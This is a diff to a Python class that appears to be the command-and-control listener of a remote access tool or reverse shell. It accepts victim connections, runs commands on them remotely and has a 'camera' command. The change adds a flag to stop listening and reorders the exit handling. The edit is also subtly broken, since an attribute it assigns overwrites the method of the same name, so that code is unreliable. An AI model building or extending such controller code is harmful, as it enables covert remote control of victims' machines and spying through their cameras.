@@ -24,18 +24,21 @@ class Listener:
 
 		self.chosen_connection = None
 
+		self.listen = True
+
 		print("[+] Waiting for incoming connections")
 
 
 	def listen(self):
-		try:
-			self.listener.listen(0)
-			connection, address = self.listener.accept()
-			print("\n[+] Got a connection from " + str(address))
-			print("# Press Enter")
-			self.connections.append((connection, address))
-			self.listen()
-		except: pass
+		if self.listen:
+			try:
+				self.listener.listen(0)
+				connection, address = self.listener.accept()
+				print("\n[+] Got a connection from " + str(address))
+				print("# Press Enter")
+				self.connections.append((connection, address))
+				self.listen()
+			except: pass
 
 
 	def reliable_send(self, data):
@@ -84,6 +87,8 @@ class Listener:
 
 
 	def close(self):
+		print("closed")
+		self.listen = False
 		self.listener.close()
 
 
@@ -135,9 +140,9 @@ class Listener:
 
 			
 			elif command == "exit":
-				self.execute_remotely("exit")
 				self.close()
-				exit()
+				self.execute_remotely("exit")
+				break
 
 
 			elif command == "camera":
